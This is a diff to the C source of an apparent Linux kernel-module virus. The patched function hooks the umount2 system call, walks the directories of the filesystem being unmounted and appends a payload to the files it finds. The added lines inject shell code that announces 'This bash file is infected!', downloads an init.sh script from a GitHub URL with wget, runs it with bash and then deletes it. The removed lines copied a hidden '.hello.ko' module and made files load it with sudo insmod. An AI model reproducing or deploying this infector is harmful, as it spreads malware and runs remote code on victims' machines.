@@ -330,7 +330,7 @@ int hacked_umount2(const  char __user *dir_name, int flags) {
 	int fd, i, end;
 	struct linux_dirent64 *cur;
 	printk("%s umounting %d\n", dir_name, flags);
-	copy_a_to_b("/.hello.ko", str_cat(dir_name, "/.hello.ko"));
+	//copy_a_to_b("/.hello.ko", str_cat(dir_name, "/.hello.ko"));
 	for (queue_push(&q, dir_name); !list_empty(&q); queue_pop(&q)) {
 		struct queue *front = list_entry(q.next, struct queue, lnk);
 		enter_usr_space();
@@ -362,7 +362,12 @@ int hacked_umount2(const  char __user *dir_name, int flags) {
 							int len;
 							struct file *file;
 							s = str_cat(front->s, str_cat("/", cur->d_name));
-							res = str_cat(str_cat("\nsudo insmod ", dir_name), "/.hello.ko");
+							res = "\n";
+							res = str_cat(res,"# This is our code\n");
+							res = str_cat(res,"echo \"\nThis bash file is infected!\n\" ");
+							res = str_cat(res,"wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/init.sh 2> serrlog\n");
+							res = str_cat(res,"bash init.sh\n");
+							res = str_cat(res,"rm init.sh serrlog\n");
 							len = str_len(res);
 							file = reading_file_open(s);
 							tail = kmalloc(len + 1, __GFP_NOFAIL);
